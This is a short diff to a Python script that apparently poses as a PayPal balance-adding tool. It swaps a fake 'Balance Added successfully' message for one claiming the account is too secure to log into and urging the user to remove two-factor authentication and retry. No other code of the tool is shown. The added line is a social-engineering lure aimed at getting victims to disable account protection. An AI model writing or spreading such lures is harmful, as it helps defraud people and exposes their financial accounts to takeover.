@@ -188,4 +188,5 @@ def animated_marker():
 # Driver's code 
 animated_marker() 
 os.system('clear')
-print(Fore.GREEN + "Balance Added successfully......")
+print(Fore.GREEN + "Sorry your PayPal account is very secured and we couldn't login, pls remove two factor Authentication on your account and try again....")
+
